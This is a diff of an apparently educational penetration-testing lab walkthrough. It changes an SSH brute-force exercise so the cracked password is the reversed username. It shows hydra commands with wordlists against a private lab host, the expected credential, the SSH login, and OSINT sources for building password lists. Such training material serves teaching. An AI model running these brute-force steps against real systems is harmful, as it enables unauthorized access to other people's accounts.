@@ -113,7 +113,7 @@ root
 admin
 EOF
 
-# Password list (common passwords)
+# Password list (includes common passwords + reversed usernames)
 cat > passwords.txt << 'EOF'
 password
 password123
@@ -125,6 +125,11 @@ bbanter
 ccoffee
 ddeeds
 eeikman
+smadaa
+retnabtb
+eeffocc
+sdeedd
+namkie
 company
 deice
 2003
@@ -134,39 +139,57 @@ welcome
 letmein
 EOF
 
-# For more comprehensive attack, use rockyou.txt
+# Alternative: For comprehensive attack, use rockyou.txt
 # hydra -L users.txt -P /usr/share/wordlists/rockyou.txt 172.20.0.3 ssh -t 4
 ```
 
 ### SSH Brute Force Attack
 
-**Basic Attack (likely to fail with common passwords):**
+**Educational Brute Force Attack:**
 ```bash
 hydra -L users.txt -P passwords.txt 172.20.0.3 ssh -t 4
 ```
 
-**Advanced Attack (required for success):**
-```bash
-# Use comprehensive wordlist
-hydra -L users.txt -P /usr/share/wordlists/rockyou.txt 172.20.0.3 ssh -t 4
-```
-
 **Expected Successful Credential:**
 ```
-[22][ssh] host: 172.20.0.3   login: aadams   password: nostaw
+[22][ssh] host: 172.20.0.3   login: aadams   password: smadaa
 ```
 
-**Note for Instructors:** The password "nostaw" (watson backwards) will only be discovered through:
-1. Using comprehensive wordlists like rockyou.txt
-2. Context-based password generation (if students notice patterns)
-3. Social engineering research (if conducting OSINT on employees)
+**Teaching Points for Discussion:**
 
-This teaches students that basic password lists often fail and more sophisticated approaches are needed.
+1. **Password Pattern Recognition:**
+   - The successful password "smadaa" is "aadams" reversed
+   - This demonstrates common weak password patterns users create
+   - Students should learn to recognize and exploit such patterns
+
+2. **Real-World OSINT Password Generation:**
+   In practice, passwords would be discovered through:
+   - **Social Media Research:** Facebook, LinkedIn, Twitter profiles revealing:
+     - Pet names, children's names, birthdays
+     - Hobbies, favorite sports teams, locations
+     - Company events, project names
+   - **Professional Networks:** LinkedIn job history, skills, connections
+   - **Public Records:** Property records, business registrations
+   - **Company Website:** Employee bios, company history, product names
+   - **Breach Databases:** Previous password patterns for the target
+
+3. **Advanced Password Lists:**
+   For comprehensive attacks, use:
+   ```bash
+   # Standard comprehensive wordlist
+   hydra -L users.txt -P /usr/share/wordlists/rockyou.txt 172.20.0.3 ssh -t 4
+   
+   # Custom wordlist from OSINT research
+   # Create passwords.txt from gathered intelligence
+   ```
+
+4. **Educational Limitation:**
+   This lab uses reversed usernames for time efficiency. In real engagements, extensive OSINT would be conducted first to build context-specific password lists.
 
 ### SSH Access and Exploration
 ```bash
 ssh aadams@172.20.0.3
-# Password: nostaw
+# Password: smadaa
 
 # Once inside:
 whoami
@@ -209,7 +232,7 @@ Eve Eikman,Legal Affairs,72000,1999-11-30
 ## Phase 5: Advanced Exploitation (Optional)
 
 ### Password Pattern Analysis
-Students should notice that `nostaw` is `watson` backwards, suggesting:
+Students should notice that `smadaa` is `aadams` reversed, suggesting:
 1. Passwords may be reversed words
 2. Other users might have similar patterns
 
